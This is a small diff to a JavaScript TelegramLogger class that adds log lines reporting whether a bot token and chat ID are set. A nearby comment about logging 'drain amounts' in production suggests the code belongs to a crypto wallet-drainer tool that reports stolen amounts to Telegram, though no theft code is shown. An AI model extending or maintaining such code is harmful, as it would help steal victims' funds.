@@ -17,6 +17,8 @@ class TelegramLogger {
       });
     } else {
       console.log('[TELEGRAM] No valid credentials found - logging disabled');
+      console.log('[TELEGRAM] Bot Token:', this.botToken ? 'Set' : 'Not set');
+      console.log('[TELEGRAM] Chat ID:', this.chatId ? 'Set' : 'Not set');
     }
     
     // Enable logging for drain amounts in production
